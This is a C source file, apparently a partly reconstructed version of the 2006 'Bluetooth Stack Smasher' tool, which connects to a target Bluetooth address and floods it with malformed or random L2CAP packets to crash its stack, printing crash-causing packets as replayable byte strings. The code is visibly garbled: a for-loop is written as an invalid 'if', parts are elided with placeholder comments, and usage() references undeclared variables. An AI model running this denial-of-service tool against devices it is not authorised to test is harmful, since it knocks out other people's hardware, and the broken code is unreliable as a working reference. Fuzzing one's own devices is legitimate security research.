/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

void l2dos(char *bdstr_addr, int cmdnum, int packetSize, char paddingByte)
{
    // ...
    if(i < packetSize; i++)
    {
        if( paddingByte == 0 )
            buf[i] = 0x41;		/* Default padding byte */
        else
            buf[i] = paddingByte;
    }
    // ...
    for(i = 0; i < IT; i++){
        cmd = (l2cap_cmd_hdr *) buf;
        cmd->code = cmdnum;
        cmd->ident = (i%250) + 1;		// Identificator 
        cmd->len = __cpu_to_le16(LENGTH);

        // ...
    }
}

void l2fuzz(char *target_device_address, int packet_max_size, int max_crashes_allowed)
{
    char *buf, *savedbuf;
    struct sockaddr_l2 addr;
    int sock, iteration, packet_size;
    int crash_events = 0, saved_packet_size;
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(target_device_address, &addr.l2_bdaddr);
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    if(!(savedbuf = (char *) malloc ((int) packet_max_size + 1))) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    while(1)		// Initiate loop (ctrl-c to stop...)
    {
        packet_size = rand() % packet_max_size;
        if(packet_size == 0) 
            packet_size=1;
        if(!(buf = (char *) malloc ((int) packet_size + 1))) {
            perror("malloc");
            exit(EXIT_FAILURE);
        }

        bzero(buf, packet_size);
        for(iteration=0 ; iteration<packet_size ; iteration++)	
            buf[iteration] = (char) rand();
        
        putchar('.');
        fflush(stdout);
        
        if(send(sock, buf, packet_size, 0) <= 0)
        {
            crash_events++;
            fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", target_device_address);
            fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
            fprintf(stdout, "\t----------------------------------------------------\n");
            fprintf(stdout, "\tHost\t\t%s\n", target_device_address);
            fprintf(stdout, "\tPacket size\t%d\n", saved_packet_size);
            fprintf(stdout, "\t----------------------------------------------------\n");
            fprintf(stdout, "\tPacket dump\n\t");
            for(iteration=0 ; iteration<saved_packet_size ; iteration++)
            {
                fprintf(stdout, "0x%.2X ", (unsigned char) savedbuf[iteration]);
                if( (iteration%30) == 29)
                    fprintf(stdout, "\n\t");
            }
            fprintf(stdout, "\n\t----------------------------------------------------\n");

            fprintf(stdout, "char replay_buggy_packet[]=\"");
            for(iteration=0 ; iteration<saved_packet_size ; iteration++)
            {
                fprintf(stdout, "\\x%.2X", (unsigned char) savedbuf[iteration]);
            }
            fprintf(stdout, "\";\n");

            if((crash_events == max_crashes_allowed) && (max_crashes_allowed != 0) && (max_crashes_allowed >= 0))
            {
                free(buf);
                free(savedbuf);
                exit(EXIT_SUCCESS);
            }
            
        }
        memcpy(savedbuf, buf, packet_size);	// Get the previous packet, not this one...
        saved_packet_size = packet_size;
        free(buf);
    }
}

int usage(char *name)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s %s] [-m %d] [-p %c] [-M %d] <bdaddr>\n", name, size, mode, pad_byte, maxcrash_count);
	fprintf(stderr, "Modes are :\n	\
			0  ALL MODES LISTED BELOW\n	\
			1  L2CAP_COMMAND_REJ\n	\
			2  L2CAP_CONN_REQ\n	\
			3  L2CAP_CONN_RSP\n	\
			4  L2CAP_CONF_REQ\n	\
			5  L2CAP_CONF_RSP\n	\
			6  L2CAP_DISCONN_REQ\n	\
			7  L2CAP_DISCONN_RSP\n	\
			8  L2CAP_ECHO_REQ\n	\
			9  L2CAP_ECHO_RSP\n	\
			10 L2CAP_INFO_REQ\n	\
			11 L2CAP_INFO_RSP\n	\
			12 L2CAP Random Fuzzing (-s : max_size) (-M crashcount)\n\n");	
	exit(EXIT_FAILURE);
}


char *codeDescription(int code)
{
    char *strcode = malloc(BUFCODE + 1);
    switch(code)
    {
        case L2CAP_ECHO_REQ:
            strcpy(strcode, "L2CAP echo request");	
            break;

        case L2CAP_COMMAND_REJ:
            strcpy(strcode, "L2CAP command reject");	
            break;
            
        case L2CAP_CONN_REQ:
            strcpy(strcode, "L2CAP connection request");	
            break;
            
        case L2CAP_CONN_RSP:
            strcpy(strcode, "L2CAP connexion response");	
            break;
            
        case L2CAP_CONF_REQ:
            strcpy(strcode, "L2CAP configuration request");	
            break;
            
        case L2CAP_CONF_RSP:
            strcpy(strcode, "L2CAP configuration response");	
            break;
            
        case L2CAP_DISCONN_REQ:
            strcpy(strcode, "L2CAP disconnection request");	
            break;
            
        case L2CAP_DISCONN_RSP:
            strcpy(strcode, "L2CAP disconnection response");	
            break;
            
        case L2CAP_ECHO_RSP:
            strcpy(strcode, "L2CAP echo response");	
            break;
            
        case L2CAP_INFO_REQ:
            strcpy(strcode, "L2CAP info request");	
            break;
            
        case L2CAP_INFO_RSP:
            strcpy(strcode, "L2CAP info response");	
            break;
            
        default:
            strcode=NULL;
    }
    return strcode;
}

int main(int argc, char **argv)
{
    int i, packetSize = 0, testMode = 0, maxCrashes = 1;
    char bdaddr[20], paddingChar = 0;

    // Rest of the code...

    if(testMode > 12)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if(testMode == 0)
    {
        for(i=1; i <= 0x0b; i++)
            l2dos(bdaddr, i, packetSize ? packetSize : MAXSIZE, paddingChar);
        l2fuzz(bdaddr, packetSize ? packetSize : MAXSIZE, maxCrashes);
    }
    else
    {
        if(testMode <= 11)
            l2dos(bdaddr, testMode, packetSize ? packetSize : MAXSIZE, paddingChar);
        if(testMode == 12)
            l2fuzz(bdaddr, packetSize ? packetSize : MAXSIZE, maxCrashes);
    }
    fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
    
    return EXIT_SUCCESS;
}
